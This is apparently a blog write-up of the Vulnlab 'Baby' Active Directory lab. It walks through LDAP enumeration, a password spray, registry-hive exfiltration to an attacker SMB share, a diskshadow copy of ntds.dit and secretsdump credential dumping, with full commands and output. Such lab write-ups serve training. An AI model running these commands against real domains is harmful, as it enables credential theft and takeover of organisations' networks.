---
categories:
    - vulnlab
layout: post
title: Baby Writeup - Vulnlab
image: /assets/posts/2020-10-20-baby-vulnlab.png
tags:
    - writeup
    - vulnlab
    - easy
---

Baby is a Windows machine focusing on Windows Active Directory on Vulnlab. It is categorized as an easy machine.

## Enumeration

Lets start with port scanning with nmap

```terminal
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-20 09:34:10Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2024-10-20T09:34:55+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Issuer: commonName=BabyDC.baby.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-07-26T09:03:15
| Not valid after:  2025-01-25T09:03:15
| MD5:   a63f:e0e6:9c19:ba19:0f14:2198:bd20:3eb3
| SHA-1: 79c6:f752:73d0:6818:241e:6087:88b0:2a7f:b0bf:ec7f
| -----BEGIN CERTIFICATE-----
| MIIC4DCCAcigAwIBAgIQFwL4czAa9aBN7bpDVkexjDANBgkqhkiG9w0BAQsFADAZ
| MRcwFQYDVQQDEw5CYWJ5REMuYmFieS52bDAeFw0yNDA3MjYwOTAzMTVaFw0yNTAx
| MjUwOTAzMTVaMBkxFzAVBgNVBAMTDkJhYnlEQy5iYWJ5LnZsMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvntpU8oF4UIGBqJLsq7P1c3QjdjDakJb/qiQ
| oz9U+2z64TtePs20cvML7dm21cx/isH8XFlG23r1MhNl2C21Xd/gnET7piCETolV
| s+Z05Cvpm/l3TCVrg8MVxSQF8GuwxOoLI13aZ822/xiTyhsIEMH6G7hc+g3lbePr
| QKBTxcSjoohTXur97lveMYSWrBo1aLkJUYYFyhUipv637S9NAS2nF2UVIeZQbqDi
| XEy2dxNoTX0HSxfLcyNeXsvrdoh2EFPb5nAPD81Ogjrpix34hDS2Q/OTNL8hiIiI
| MpfE0JP06SCqaxkIs8X86/6vpgbh41dz659cSbL6hTyfAQPYVQIDAQABoyQwIjAT
| BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD
| ggEBADiIqN/vl7WhXDBvKxZpwTYdO/0Jovvp6BeucDMtCY7bj4BwifTzK2uBcGrd
| KmxOFqOub6j6wrISXTDBdU3qOLSndNyDLSihg69sMmW2toXGtgEr4VEJdl3aMflA
| fsk8bxr/qLWXSjffR+qkrEEjnxqaTb365SRYrBGPM++2yh/yz8ZHtm0catlDxG8I
| VNHzYX6m5B3VJC+lHhAdeUXDhyVvWlBbf5tHKKhY+QU4dijhMA4puS0V15dFfWDJ
| cg/QS0HaroEBpvm/Z1tz4ID1TOj5Wbuo4kz7zBnnAsphno/VRrG8bTf+niSiAbvg
| wrHcuksgbJuSK/OeFaovZ08SO9c=
|_-----END CERTIFICATE-----
| rdp-ntlm-info:
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-10-20T09:34:15+00:00
5357/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-10-20T09:34:16
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 26485/tcp): CLEAN (Timeout)
|   Check 2 (port 49007/tcp): CLEAN (Timeout)
|   Check 3 (port 44720/udp): CLEAN (Timeout)
|   Check 4 (port 35831/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
```
From the port scan we can see that the machine is a Domain Controller with standard ports open. There is also information regarding the domain name and hostname, lets add this to our `/etc/hosts`file.

```bash
echo "10.10.95.204 BabyDC.baby.vl baby.vl" | sudo tee -a /etc/hosts
```

Lets start with some more basic enumeration of smb and ldap. Running `netexec` command for smb I was able to connect but this lead to nothing further.  Enumerating ldap we can see that ldap anonymous bind is enabled which allows us to query information about the AD. We can use `ldapsearch` or `netexec ldap`.

Checking for passwords in users description we get a hit
```terminal
nxc ldap BabyDC.baby.vl -u '' -p '' -M get-desc-users

SMB         10.10.95.204    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
LDAP        10.10.95.204    389    BABYDC           [+] baby.vl\:
GET-DESC... 10.10.95.204    389    BABYDC           [+] Found following users:
GET-DESC... 10.10.95.204    389    BABYDC           User: Guest description: Built-in account for guest access to the computer/domain
GET-DESC... 10.10.95.204    389    BABYDC           User: Teresa.Bell description: Set initial password to BabyStart123!
```

Trying to connect with this user and password will not work as the password was probably changed. The password here might have been setup by the admins for newly created accounts. Lets get a list of users and perform password spray

```terminal
ldapsearch -x -b "dc=baby,dc=vl" -s sub "(objectclass=person)" sAMAccountName -H ldap://10.10.95.204 | grep 'sAMAccountName' | cut -d ':' -f2 > users

sAMAccountName
Guest
Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Ian.Walker
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
Caroline.Robinson
```
Lets use `netexec` to spray this password. Alternately `kerbrute` can also be used here

```terminal
nxc smb 10.10.95.204 -u users -p 'BabyStart123!' --no-bruteforce
...
SMB         10.10.95.204    445    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.10.95.204    445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
...
```

We get a hit but with the massage that the password needs to be changed. Using `smbpasswd` we can change the password for this account

```terminal
smbpasswd -r 10.10.95.204 -U 'Caroline.Robinson'
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user Caroline.Robinson
```

## Initial Access

Enumerating the DC with the obtained credentials we can see that the user has read privileges to all of the shares in the DC indicating that this account is of high value. It is also able to login to the machine using winrm.

```terminal
SMB         10.10.95.204    445    BABYDC           Share           Permissions     Remark
SMB         10.10.95.204    445    BABYDC           -----           -----------     ------
SMB         10.10.95.204    445    BABYDC           ADMIN$          READ            Remote Admin
SMB         10.10.95.204    445    BABYDC           C$              READ,WRITE      Default share
SMB         10.10.95.204    445    BABYDC           IPC$            READ            Remote IPC
SMB         10.10.95.204    445    BABYDC           NETLOGON        READ            Logon server share
SMB         10.10.95.204    445    BABYDC           SYSVOL          READ            Logon server share

WINRM       10.10.95.204    5985   BABYDC           [+] baby.vl\Caroline.Robinson:P@ssword! (Pwn3d!)
```


## Privilege Escalation

Checking the user permissions using `whoami /all` we can see that the user is part of `Backup Operators` group. This group allows the user to read and backup any file on the machine. Lets abuse this to get the domain credentials. We can use impacket's `reg` script to obtain the `SAM, SYSTEM and SECURITY` hives


Lets start an smbshare to copy the hive locally and start the command
```
smbserver.py -smb2support "someshare" "./"
```

```
impacket-reg "baby.vl"/"Caroline.Robinson":'P@ssword!'@'10.10.95.204' backup -o '\\IP\someshare'
...
[*] Saved HKLM\SYSTEM to \\IP\someshare\SAM.save
[*] Saved HKLM\SYSTEM to \\IP\someshare\SYSTEM.save
[*] Saved HKLM\SECURITY to \\IP\someshare\SECURITY.save
```
Using impackets `sercretsdump` we can read the hives and get credentials

```
impacket-secretsdump -sam SAM.save -security SECURITY.save -system SYSTEM.save local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:172ae39fa89219c89eb0f2aef82336fb8cb620527bfdb510d8270cc20d3f68fafbdda2c61ffb309c404fb446595bbeceb2053a50f18aef717094f23831f968e97aa2f6374b7351b80da44265e35970327070d421f441d93dcbf15357f5bd8524c59604a1dfd99dfa786d550aff176c9b1fdd669b04a27069e8e7c0ddb3a36fcf6349dff508b66c551214f565a9a58748d924dbf9eca372da7b46dc9d39c9ceb9b5c07dc95abaed4ffebed83c2ae5fb3c09601d0fd68e3191576d78962d7dbbff927b4afb2a227a374cf942fb4ceb69ff22886e1264a3f46beaef0f51da182543408d1250f2a497ac08a82507620e95e4
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:cdb49927a4d541b2d6c67f3034265164
[*] DPAPI_SYSTEM
dpapi_machinekey:0xe620195f1a5e2d71842bbad9877d7c3ca8a31eda
dpapi_userkey:0x026920834cd39c2e8ba9401c44a8869fe6be0555
[*] NL$KM
 0000   B6 96 C7 7E 17 8A 0C DD  8C 39 C2 0A A2 91 24 44   ...~.....9....$D
 0010   A2 E4 4D C2 09 59 46 C0  7F 95 EA 11 CB 7F CB 72   ..M..YF........r
 0020   EC 2E 5A 06 01 1B 26 FE  6D A7 88 0F A5 E7 1F A5   ..Z...&.m.......
 0030   96 CD E5 3F A0 06 5E C1  A5 01 A1 CE 8C 24 76 95   ...?..^......$v.
NL$KM:b696c77e178a0cdd8c39c20aa2912444a2e44dc2095946c07f95ea11cb7fcb72ec2e5a06011b26fe6da7880fa5e71fa596cde53fa0065ec1a501a1ce8c247695
[*] Cleaning up...
```
Trying to auth with the Administrator credentials fails as this is the  local admin of the machine, trying with --local-auth as well fails probably due to the account being disabled

```
nxc smb 10.10.95.204 -u 'administrator' -H '8d992faed38128ae85e95fa35868bb43'
SMB         10.10.95.204    445    BABYDC           [-] baby.vl\administrator:8d992faed38128ae85e95fa35868bb43 STATUS_LOGON_FAILURE

nxc smb 10.10.95.204 -u 'administrator' -H '8d992faed38128ae85e95fa35868bb43' --local-auth
SMB         10.10.95.204    445    BABYDC           [-] BABYDC\administrator:8d992faed38128ae85e95fa35868bb43 STATUS_LOGON_FAILURE
```

In order to get the domain credentials we would need to read the `ntds.dit` file, we can utilize the below script on the machine to backup the `C:` drive and expose it as `E:` allowing us to read get the `ntds.dit` file

```batch
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```

Executing the script and copy the file over from E:
```
*Evil-WinRM* PS C:\temp> diskshadow /s script.txt 
*Evil-WinRM* PS C:\temp> robocopy /b E:\Windows\ntds . ntds.dit
*Evil-WinRM* PS C:\temp> download ntds.dit
```

We can now pass the ntds.dit file to secrets dump, which will give us the domain credentials
```
impacket-secretsdump -sam SAM.save -security SECURITY.save -system SYSTEM.save -ntds ntds.dit local
.....
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457[-]123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6[-]89c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:cdb4[-]5164:::
.....
```